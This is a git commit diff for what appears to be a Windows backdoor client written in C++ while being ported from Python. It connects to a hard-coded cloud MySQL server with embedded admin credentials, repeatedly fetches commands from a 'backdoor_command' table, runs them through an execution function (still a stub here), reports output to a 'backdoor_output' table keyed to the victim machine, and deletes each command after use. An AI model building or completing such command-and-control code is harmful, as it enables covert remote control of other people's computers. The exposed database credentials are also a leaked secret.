2697aa8e1f46cd42c95dd5c83a1e726e3d6c23f8
ArmenG <armeng2007@gmail.com>
2022-06-28 16:17:59 -0700

    Worked More on Conversion from .py to .cpp

--- client/CppBDoor/CppBDoor/main.cpp
+++ client/CppBDoor/CppBDoor/main.cpp
@@ -7,23 +7,24 @@
 #include <cppconn/driver.h>
 #include <cppconn/exception.h>
 #include <cppconn/prepared_statement.h>
+#include <iostream>
+#include <ctime>
 using namespace std;
 
 
+string execute_command(string);
+int pc_id = -1;
 
-string execute_command(string command);
-{
-
-}
 int main()
 {
     sql::Driver* driver;
     sql::Connection* con;
     sql::Statement* stmt;
     sql::ResultSet* res;
+    sql::PreparedStatement* pstmt;
+
     int get_local_hostname(std::string & hostname);
-    int pc_id = -1;
-    string output;s
+    string output;
     driver = get_driver_instance();
     con = driver->connect("database.cun6wzt30wpz.us-west-1.rds.amazonaws.com", "admin", "databasepassword");
 
@@ -33,12 +34,9 @@ int main()
     TCHAR computer_name[UNLEN + 1];
     DWORD computer_len = UNLEN + 1;
     GetComputerName((TCHAR*)computer_name, &computer_len);
-    wcout << computer_name << endl;
     while (res->next()) {
           if ("DESKTOP-MDQGCN5" == res->getString("pc_name"))
           {
-              cout << "id = " << res->getInt(1);
-              cout << ", pc_name = '" << res->getString("pc_name") << "'" << endl;
               pc_id = res->getInt(1);
           }
     }
@@ -50,10 +48,23 @@ int main()
     }
     while (true)
     {
+
         res = stmt->executeQuery("SELECT * FROM backdoor_command");
         while (res->next()) {
-            cout << res->getString("command") << endl;
+             string output = "";
+             output = execute_command(res->getString("command"));
+             pstmt = con->prepareStatement("INSERT INTO backdoor_output(command,output,target_id) VALUES(?,?,?)");
+             pstmt->setString(1, res->getString("command"));
+             pstmt->setString(2, output);
+             pstmt->setInt(3, pc_id);
+             pstmt->execute();
+             
+             pstmt = con->prepareStatement("DELETE FROM backdoor_command WHERE id=?");
+             pstmt->setInt(1, res->getInt("id"));
+             pstmt->execute();
+
         }
+
         Sleep(1);
     }
 
@@ -62,4 +73,11 @@ int main()
 
     system("pause");
     return 0;
+}
+string execute_command(string command)
+{
+    string output = "";
+    cout << command << endl;
+    cout << pc_id;
+    return output;
 }
